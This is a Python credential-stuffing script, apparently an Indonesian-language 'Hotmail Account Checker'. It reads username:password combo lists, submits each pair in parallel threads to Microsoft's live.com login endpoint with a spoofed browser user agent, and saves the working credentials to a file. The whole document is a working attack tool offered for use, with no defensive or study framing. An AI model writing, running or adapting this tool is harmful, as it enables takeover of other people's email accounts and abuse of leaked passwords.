import requests
import concurrent.futures
import argparse
from colorama import init, Fore, Style
from tqdm import tqdm

# Inisialisasi colorama
init(autoreset=True)

BANNER = f"""
{Fore.CYAN}
███████╗██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗
██╔════╝██║  ██║██╔════╝██╔═══██╗██║   ██║██╔════╝
███████╗███████║█████╗  ██║   ██║██║   ██║███████╗
╚════██║██╔══██║██╔══╝  ██║   ██║██║   ██║╚════██║
███████║██║  ██║███████╗╚██████╔╝╚██████╔╝███████║
╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝
{Fore.YELLOW}
Hotmail Account Checker | By Mr.4Rex_503
{Style.RESET_ALL}
"""

def print_banner():
    print(BANNER)

def check_hotmail_account(username, password):
    """
    Fungsi untuk memeriksa validitas akun Hotmail (Outlook).
    """
    session = requests.Session()
    login_url = "https://login.live.com/login.srf"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    payload = {
        "client_id": "000000004C12AE6F",
        "redirect_uri": "https://account.live.com/oauth20_desktop.srf",
        "response_type": "token",
        "scope": "service::outlook.com::MBI_SSL",
        "login": username,
        "passwd": password,
    }

    try:
        response = session.post(login_url, data=payload, headers=headers, timeout=10)
        if "access_token" in response.text or "Sign in to your Microsoft account" not in response.text:
            return (username, password, "VALID")
        else:
            return (username, password, "INVALID")
    except Exception as e:
        return (username, password, f"ERROR: {str(e)}")

def process_accounts(input_file, valid_output_file, invalid_output_file):
    """
    Fungsi untuk membaca file input, memproses akun, dan menyimpan hasilnya.
    """
    with open(input_file, "r") as f:
        accounts = [line.strip().split(":") for line in f if ":" in line]

    valid_accounts = []
    invalid_accounts = []

    print(f"{Fore.GREEN}[+] Memulai proses pemeriksaan akun...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Total akun yang akan diproses: {len(accounts)}{Style.RESET_ALL}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_hotmail_account, username, password) for username, password in accounts]
        for future in tqdm(concurrent.futures.as_completed(futures), total=len(accounts), desc="Memeriksa akun"):
            username, password, status = future.result()
            if "VALID" in status:
                valid_accounts.append(f"{username}:{password}")
            else:
                invalid_accounts.append(f"{username}:{password} - {status}")

    # Simpan akun valid
    with open(valid_output_file, "w") as f:
        f.write("\n".join(valid_accounts))

    # Simpan akun tidak valid
    with open(invalid_output_file, "w") as f:
        f.write("\n".join(invalid_accounts))

    print(f"\n{Fore.GREEN}[+] Proses selesai!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Akun valid disimpan di: {valid_output_file}{Style.RESET_ALL}")
    print(f"{Fore.RED}[+] Akun tidak valid disimpan di: {invalid_output_file}{Style.RESET_ALL}")

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Hotmail Account Checker")
    parser.add_argument("-i", "--input", help="Path file input (txt)", required=True)
    parser.add_argument("-v", "--valid", help="Path file output untuk akun valid (txt)", required=True)
    parser.add_argument("-iv", "--invalid", help="Path file output untuk akun tidak valid (txt)", required=True)

    args = parser.parse_args()

    process_accounts(args.input, args.valid, args.invalid)
